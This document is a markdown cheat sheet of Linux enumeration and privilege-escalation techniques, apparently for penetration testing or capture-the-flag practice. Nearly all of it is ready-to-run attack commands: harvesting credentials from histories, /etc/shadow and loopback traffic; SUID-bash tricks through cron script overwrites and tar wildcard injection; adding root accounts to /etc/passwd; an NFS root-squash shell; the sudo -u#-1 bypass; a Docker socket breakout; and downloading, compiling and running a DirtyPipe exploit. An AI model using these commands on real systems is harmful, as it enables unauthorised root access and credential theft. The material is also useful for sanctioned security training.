# Linux Enumeration and Privilege Escalation
## Enumeration
-> Basic System Enumeration
```bash
uname -a 
hostname 
lscpu 
ls /home 
ls /var/www/html 
ls /var/www/
ps aux | grep root 
netstat -tulpn 
ps -aux | grep root | grep mysql
ifconfig 
find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \;
locate pass | more
```

-> Get system distribution and version
```bash
cat /etc/*-release
```

-> Get kernel version
```bash
cat /proc/version   
uname -a
```

-> View variable environments 
```bash
env
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
cat ~/.zshrc
```

-> View user command history
```bash
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

-> List running processes
```bash
ps aux
```

-> Service Footprints
```bash
watch -n 1 "ps -aux | grep pass"
```
```bash
sudo tcpdump -i lo -A | grep "pass"
```

-> View interfaces and network information 
```bash
ifconfig
ip addr
ss -anp
```

-> View all active TCP connections and the TCP and UDP ports the host is listening on.
```bash
netstat -ant
```

-> Get DNS resolver and hosts mapped to an IP
```bash
cat /etc/resolv.conf
cat /etc/hosts
```

-> Get system user, group and password information
```bash
cat /etc/passwd
cat /etc/shadow
```

### Extracting database information
#### PostgreSQL
-> psql terminal as postgres user
```bash
su postgres
psql
```
-> list the databases
```bash
\list
``` 

-> select the database
```bash
\c <database>
```

-> list the tables
```bash
\d
```

-> dump
```bash
select * from <table>;
```

-> read files
```bash
CREATE TABLE demo(t text);
COPY demo from '<filename>';
SELECT * FROM demo;
```

#### SQLite
-> access database
```bash
sqlite3 <database.db>
```

-> list the tables
```bash
.tables
```

-> dump
```bash
select * from <table>;
```

#### MySQL
```bash
mysql -u root -h localhost -p
```
-> list the databases
```bash
show databases;
```
-> select the database
```bash
use <database>;
```

-> list the tables
```bash
show tables;
```

-> dump
```bash
SELECT * FROM <table>;
```

### Other Tips
-> Perform code review on web server files (/var/www/html);
-> Check log files for credentials;

--- 

## Privilege Escalation
### Crontab [PrivEsc]
-> Enumeration  
```bash
cat /var/log/cron.log                                                                                                                                              
cat /etc/crontab
```
```bash
contab -l
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
```
```bash
ls -lah /etc/cron*
grep "CRON" /var/log/syslog
```
```bash
crontab -l
sudo crontab -l
```

-> Exploitation  
```bash
echo "chmod +s /bin/bash" >> script.sh
```

### Privilege Escalation via Root Executable Python Script Overwrite
```bash
cat /etc/crontab
```

-> Output like this
```bash
* * * * * root /var/www/html/file.py
```

-> Modify file
```bash
cd /var/www/html/
vi file.py
```

-> Import lib
```bash
import os
os.system("chmod +s /bin/bash")
```

### Privilege Escalation via Tar Bash Script (WildCards)
-> Listing "/etc/crontab" file
```bash
* * * * * root /usr/bin/local/file.sh
```

-> Output
```
#!/bin/bash

cd /var/www/html/
tar czf /tmp/file2.tar.gz *
```

-> Exploit
```
cd /var/www/html/

echo "#!/bin/bash" > priv.sh
echo "chmod +s /bin/bash" >> priv.sh
chmod +x priv.sh
```
```
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=sh\ priv.sh
```

- https://github.com/gurkylee/Linux-Privilege-Escalation-Basics

### SUID [PrivEsc]
-> Enumeration 
```bash
find / -perm -u=s -type f 2>/dev/null
```
or  
```bash
id
find / -perm -u=s -type f -group <group> 2>/dev/null
```

-> Example 
```bash
find / -perm -u=s -type f 2>/dev/null
```
```bash
/usr/bin/find
/usr/bin/chsh
/usr/bin/passwdflag
```

-> Permitions 
```bash
ls -l /usr/bin/passwdflag
```
```
-rwsr-xr-x 1 root root 68574 Jan  5 18:00 /usr/bin/passwdflag
```

-> Searching strings
```bash
strings /usr/bin/passwdflag | grep "pass"
```

-> Exploitation  
- https://gtfobins.github.io/

### Capabilities [PrivEsc]
-> Enumeration  
```bash
getcap -r / 2>/dev/null
```

-> Exploitation  
- https://gtfobins.github.io/

### Binary with Sudo [PrivEsc]
```bash
sudo -l
```
or  
```bash
cat /etc/sudoers
```

-> Exploitation  
- https://gtfobins.github.io/

#### Run commands as another user with permission through sudo [PrivEsc]
```bash
sudo -u <username> <command>
```

### Weak File Permissions / Passwd Writabble [PrivEsc]
-> Enumeration  
```bash
ls -la /etc/passwd
ls -la /etc/shadow
```

-> Exploitation  
```bash
echo "user:$(openssl passwd password123):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
```

### Directory Writable
-> Enumeration
```bash
find / -writable -type d 2>/dev/null
```

### Writable Password Files
-> If you have write permission on this files
```bash
/etc/passwd
/etc/shadow
/etc/sudoers
```

-> passwd file
```bash
echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd
su - root2
id && whoami
```
or 
```
openssl passwd -1 -salt mysalt NewP@ssword1
Copy output
echo "root2:<output>:0:0:root:/root:/bin/bash" >> /etc/passwd
Replace <output> with the copied output
su root2
id && whoami
```


### NFS Root Squashing
-> Detection - VM Owned
```bash
cat /etc/exports
```

-> Viewing nfs directories with access - Attacker VM
```
showmount -e <ip>
```

-> Get nfs version - Attacker VM
```bash
rpcinfo <ip>
```

-> Mount - Attacker VM
```bash
mkdir /tmp/1
mount -o rw,vers=2 <ip>:/<nfs_directory> /tmp/1
```

-> Creating and compiling file for privesc - Attacker VM
```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x
```

-> Exploitation - VM Owned
```bash
/tmp/x
id
```

### sudo < v1.28 - @sickrov [PrivEsc]
```bash
sudo -u#-1 /bin/bash
```

### Docker Breakout [PrivEsc]
-> Search the socket
```bash
find / -name docker.sock 2>/dev/null
```

-> list images  
```bash
docker images
```

-> Exploitation
```bash
docker run -it -v /:/host/ <image>:<tag> chroot /host/ bash
```

## Kernel Vulnerabilities
### DirtyPipe - CVE-2022-0847
-> Get information
```bash
cat /etc/issue
uname -r
arch
```

-> Validate softwares
```bash
whereis gcc
whereis python
whereis curl
whereis wget
```

-> Searching public exploit
```bash
searchsploit "linux kernel 5.9"
searchsploit -m 50808.c
```

-> Find file has a SUID permission
```bash
find / -perm -u=s -type f 2>/dev/null
```

-> Move to target and compile
```bash
cd /tmp
wget http://<IP>/50808.c
chmod +x 50808.c
gcc 50808.c -o 50808
```

-> Exploit
```bash
./50808 <SUID-FILE>
```


### Linux Enumeration Tools [PrivEsc]
-> Linpeas
```bash
./linpeas.sh
```
- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

-> pspy (unprivileged Linux process snooping)  
```bash
./pspy64
```
- https://github.com/DominicBreuker/pspy

-> linux-exploit-suggester
```bash
./linux-exploit-suggester.sh
```
or  
```bash
./linux-exploit-suiggester.sh --uname <uname-string>
```
- https://github.com/The-Z-Labs/linux-exploit-suggester

-> Unix Privesc Check
```bash
./unix-privesc-check
```
- https://pentestmonkey.net/tools/audit/unix-privesc-check
